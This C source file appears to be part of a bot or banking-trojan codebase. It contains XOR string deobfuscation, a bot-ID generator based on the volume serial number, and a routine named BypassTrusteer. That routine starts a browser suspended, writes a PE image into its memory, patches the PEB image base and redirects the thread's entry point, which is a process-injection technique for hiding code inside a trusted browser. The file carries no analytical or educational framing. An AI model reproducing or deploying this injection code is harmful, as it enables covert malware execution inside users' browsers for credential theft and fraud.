#include <ShlObj.h>
#include <Winternl.h>


char* UnEnc(char* enc, char* key, DWORD encLen)
{
	char* unEnc = (char*)LocalAlloc(LPTR, encLen + 1);
	unEnc[encLen] = 0;
	for (DWORD i = 0; i < encLen; ++i)
		unEnc[i] = enc[i] ^ key[i % lstrlenA(key)];
	return unEnc;
}

ULONG PseudoRand(ULONG* seed)
{
	return (*seed = 1352459 * (*seed) + 2529004207);
}

void GetBotId(char* botId)
{
	CHAR windowsDirectory[MAX_PATH];
	CHAR volumeName[8] = { 0 };
	DWORD seed = 0;

	if (GetWindowsDirectoryA(windowsDirectory, sizeof(windowsDirectory)))
		windowsDirectory[0] = L'C';

	volumeName[0] = windowsDirectory[0];
	volumeName[1] = ':';
	volumeName[2] = '\\';
	volumeName[3] = '\0';

	GetVolumeInformationA(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);

	GUID guid;
	guid.Data1 = PseudoRand(&seed);

	guid.Data2 = (USHORT)PseudoRand(&seed);
	guid.Data3 = (USHORT)PseudoRand(&seed);
	for (int i = 0; i < 8; i++)
		guid.Data4[i] = (UCHAR)PseudoRand(&seed);

	wsprintfA(botId, (PCHAR)"%08lX%04lX%lu", guid.Data1, guid.Data3, *(ULONG*)& guid.Data4[2]);
}




BOOL VerifyPe(BYTE* pe, DWORD peSize)
{
	if (peSize > 1024 && pe[0] == 'M' && pe[1] == 'Z')
		return TRUE;
	return FALSE;
}

BOOL IsProcessX64(HANDLE hProcess)
{
	SYSTEM_INFO systemInfo;
	GetNativeSystemInfo(&systemInfo);
	if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
		return FALSE;

	BOOL wow64;
	IsWow64Process(hProcess, &wow64);
	if (wow64)
		return FALSE;

	return TRUE;
}



void* Alloc(size_t size)
{
	void* mem =malloc(size);
	return mem;
}

void* ReAlloc(void* mem2realloc, size_t size)
{
	void* mem = realloc(mem2realloc, size);
	return mem;
}

#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget)
{
	unsigned char* p = static_cast<unsigned char*>(pTarget);
	while (cbTarget-- > 0)
	{
		*p++ = static_cast<unsigned char>(value);
	}
	return pTarget;
}

DWORD GetPidExplorer()
{
	for (;;)
	{
		HWND hWnd = FindWindowA("explorer", NULL);
		if (hWnd)
		{
			DWORD pid;
			GetWindowThreadProcessId(hWnd, &pid);
			return pid;
		}
		Sleep(500);
	}
}





void CopyDir(char* from, char* to)
{
	char fromWildCard[MAX_PATH] = { 0 };
	lstrcpyA(fromWildCard, from);
	lstrcatA(fromWildCard, (PCHAR)"\\*");

	if (!CreateDirectoryA(to, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
		return;
	WIN32_FIND_DATAA findData;
	HANDLE hFindFile = FindFirstFileA(fromWildCard, &findData);
	if (hFindFile == INVALID_HANDLE_VALUE)
		return;

	do
	{
		char currFileFrom[MAX_PATH] = { 0 };
		lstrcpyA(currFileFrom, from);
		lstrcatA(currFileFrom, (PCHAR)"\\");
		lstrcatA(currFileFrom, findData.cFileName);

		char currFileTo[MAX_PATH] = { 0 };
		lstrcpyA(currFileTo, to);
		lstrcatA(currFileTo, (PCHAR)"\\");
		lstrcatA(currFileTo, findData.cFileName);

		if
			(
				findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
				lstrcmpA(findData.cFileName, (PCHAR)".") &&
				lstrcmpA(findData.cFileName, (PCHAR)"..")
				)
		{
			if (CreateDirectoryA(currFileTo, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
				CopyDir(currFileFrom, currFileTo);
		}
		else
			CopyFileA(currFileFrom, currFileTo, FALSE);
	} while (FindNextFileA(hFindFile, &findData));
}

//todo: better error handling




void GetTempPathBotPrefix(char* path)
{
	GetTempPathA(MAX_PATH, path);
	char botId[BOT_ID_LEN] = { 0 };
	GetBotId(botId);
	lstrcatA(path, botId);
}

static HANDLE hX86 = NULL;
static HANDLE hX64 = NULL;

DWORD BypassTrusteer(PROCESS_INFORMATION* processInfoParam, char* browserPath, char* browserCommandLine)
{
	HANDLE hBrowser = CreateFileA
	(
		browserPath,
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hBrowser == INVALID_HANDLE_VALUE)
		return NULL;

	BOOL  ret = NULL;
	DWORD read;
	DWORD browserSize = GetFileSize(hBrowser, NULL);
	BYTE* browser = (BYTE*)Alloc(browserSize);

	ReadFile(hBrowser, browser, browserSize, &read, NULL);
	CloseHandle(hBrowser);

	STARTUPINFOA        startupInfo = { 0 };
	PROCESS_INFORMATION processInfo = { 0 };
	if (!processInfoParam)
	{
		CreateProcessA
		(
			browserPath,
			browserCommandLine,
			NULL,
			NULL,
			FALSE,
			CREATE_SUSPENDED,
			NULL,
			NULL,
			&startupInfo,
			&processInfo
		);
	}
	else
		processInfo = *processInfoParam;

	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)browser;
	IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(browser + dosHeader->e_lfanew);
	IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*)(ntHeaders + 1);
	PROCESS_BASIC_INFORMATION processBasicInfo = { 0 };
	CONTEXT                   context = { 0 };
	DWORD                     retSize;

	PVOID remoteAddress = VirtualAllocEx
	(
		processInfo.hProcess,
		LPVOID(ntHeaders->OptionalHeader.ImageBase),
		ntHeaders->OptionalHeader.SizeOfImage,
		0x3000,
		PAGE_EXECUTE_READWRITE
	);

	context.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(processInfo.hThread, &context))
		goto exit;


	if (!WriteProcessMemory(processInfo.hProcess, remoteAddress, browser, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
		goto exit;
	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
	{
		if (!WriteProcessMemory
		(
			processInfo.hProcess,
			LPVOID(DWORD64(remoteAddress) + sectionHeader[i].VirtualAddress),
			browser + sectionHeader[i].PointerToRawData,
			sectionHeader[i].SizeOfRawData,
			NULL
		)) goto exit;
	}

	NtQueryInformationProcess(processInfo.hProcess, (PROCESSINFOCLASS)0, &processBasicInfo, sizeof(processBasicInfo), &retSize);

	if (!WriteProcessMemory(processInfo.hProcess, LPVOID(DWORD64(processBasicInfo.PebBaseAddress) + sizeof(LPVOID) * 2), &remoteAddress, sizeof(LPVOID), NULL))
		goto exit;
#ifndef _WIN64
	context.Eax = (DWORD)remoteAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
	context.Rcx = (DWORD64)remoteAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif

	if (!SetThreadContext(processInfo.hThread, &context))
		goto exit;
	ResumeThread(processInfo.hThread);
	ret = processInfo.dwProcessId;
exit:
	CloseHandle(processInfo.hProcess);
	CloseHandle(processInfo.hThread);
	free(browser);
	return ret;
}